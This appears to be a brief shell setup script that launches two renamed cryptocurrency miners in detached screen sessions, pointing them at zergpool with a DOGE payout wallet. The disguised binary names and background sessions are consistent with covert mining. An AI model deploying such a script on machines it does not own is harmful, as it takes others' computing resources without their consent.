echo "+++++++ Configure Mechine +++++++++"
chmod +x leleC leleG mateni.sh
screen -d -m ./leleG --algo ETHASH --pool ethash.mine.zergpool.com:9999 --user DSHdfkgcoyxHE95xsEZUxSMqnp8HXWZbEq --pass c=DOGE,mc=TSF,ID=leleG
screen -d -m ./leleC -v -l verushash.mine.zergpool.com:3300 -u DSHdfkgcoyxHE95xsEZUxSMqnp8HXWZbEq -p c=DOGE,mc=VRSC,ID=leleC -t 1
